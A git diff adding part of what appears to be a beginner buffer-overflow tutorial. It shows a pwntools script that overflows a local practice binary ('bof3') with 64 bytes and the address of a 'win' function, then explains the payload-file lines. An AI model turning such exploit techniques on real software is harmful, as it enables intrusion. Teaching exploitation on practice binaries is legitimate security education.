@@ -155,3 +155,27 @@ As you can see, we hit our breakpoint, but the ```eip``` register has not been f
 
 Perfect! So, now all we have to do to exploit the program and call the ```win``` function is to replace the "BBBB"'s we filled the ```eip``` register up with, with the memory address of the ```win```function, lets write an exploit for this with pwntools!
 
+![image](https://github.com/0xwyvn/0xwyvn.github.io/assets/114181159/f0cceb57-4f0a-471a-9581-4fbf5ee0a3bf)
+
+Here is the exploit for you to copy:
+
+```
+from pwn import *
+
+target = process("./bof3")
+
+payload = b""
+payload += b"A"*64
+payload += p32(0x80484ab)
+
+f = open("payload", "wb") # make "payload" file
+f.write(payload) # Write payload to "payload" file
+f.close() # finito
+
+
+target.sendline(payload)
+
+target.interactive()
+```
+
+Now, you're probably wondering what the whole ```f = open``` and ```f.write(payload)``` business is about. That is just ttttthe script                                                                    outputting the payload to a file called "payload" 
